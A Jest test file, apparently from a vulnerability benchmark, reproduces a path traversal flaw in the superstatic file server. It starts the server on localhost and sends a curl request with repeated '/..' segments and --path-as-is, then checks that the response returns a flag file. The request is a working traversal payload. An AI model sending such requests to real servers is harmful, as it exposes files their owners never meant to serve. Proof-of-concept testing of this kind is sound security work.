//
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in superstatic", (done) => {
  const fs = require("fs");
  const sleep = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let server = "node ./node_modules/superstatic/bin/server"; //to start the server
  let exe = exec(server, (error, stdout) => {}); //starting the server
  //console.log(exe.pid)
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:3474${genstr()}"`;
  let end_serv ='fuser -k 3474/tcp'

  exec(attack_string, (error, stdout) => {
    //attack
    expect(stdout).toBe(hostsFile);

    exec(end_serv, (error, stdout) => {
      done();
    });
  });
},10000);
